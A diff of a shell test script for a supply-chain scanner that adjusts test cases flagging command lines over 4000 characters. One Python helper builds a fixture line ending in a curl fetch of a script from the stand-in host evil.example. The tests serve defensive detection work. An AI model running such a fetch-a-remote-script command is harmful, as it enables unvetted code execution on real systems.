@@ -745,7 +745,7 @@ check grep -Eq '[0-9a-f]{12}' "$work/cap4001.out"
 capline capslow '": $(cat \"" + "$x" * 1996'
 CASE="AC5: a line of 4001 characters built to make a backtracking pattern slow is a finding and goes through the whole check in under one second of CPU"
 check test "$rc" -eq 1; check grep -qF 'a command line over 4000 characters' "$work/capslow.out"; check test "$cap_ms" -lt 1000
-capline capcurl "'curl ' + 'http://a ' * 444"
+capline capcurl "'curl ' + 'http://a ' * 445"
 CASE="AC5: a line of 4001 characters of 'curl http://a' repeated is a finding and takes under one second of CPU"
 check test "$rc" -eq 1; check grep -qF 'a command line over 4000 characters' "$work/capcurl.out"; check test "$cap_ms" -lt 1000
 capline cap1mb "'curl ' + 'http://a ' * 110000"
@@ -759,7 +759,7 @@ CASE="AC5: the items reader (pin-inventory) reports a line over 4000 characters 
 check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
 import importlib.util, sys
 spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
-def line(n): return "echo " + "a" * (n - 5 - 31) + "; curl -sL https://evil.example/x.sh"
+def line(n): return "echo " + "a" * (n - 5 - 36) + "; curl -sL https://evil.example/x.sh"
 over = inv.unmeasured({"bin/x.sh": line(4001) + "\n"})
 assert any("a command line over 4000 characters" in str(x) for x in over), over
 exact = inv.unmeasured({"bin/x.sh": line(4000) + "\n"})
